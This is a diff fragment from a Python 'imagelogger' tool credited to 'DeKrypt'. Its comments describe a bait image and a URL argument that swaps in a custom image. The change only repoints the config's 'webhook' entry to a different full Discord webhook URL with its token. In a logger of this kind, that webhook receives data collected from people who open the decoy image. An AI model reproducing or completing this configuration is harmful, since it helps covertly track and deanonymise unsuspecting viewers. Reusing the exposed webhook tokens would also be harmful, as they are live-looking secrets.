@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1145738987252764792/ZlYGwM7HRwogMoAEU0r6U38rmHbhL18AraTEhtSm1SeK7n46rmmaCKV2sfbczWajSzFu",
+    "webhook": "https://discord.com/api/webhooks/1147299488558485544/i-4WE6mhP0RCc0_tAf5WhD5IRDbaQcjW6DA47Hjq9Dr35ATQRt5mm4UVshU3TILNOYSd",
     "image": "https://wallpapers.com/images/hd/purple-skull-trooper-p7yy73jll67pokde.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
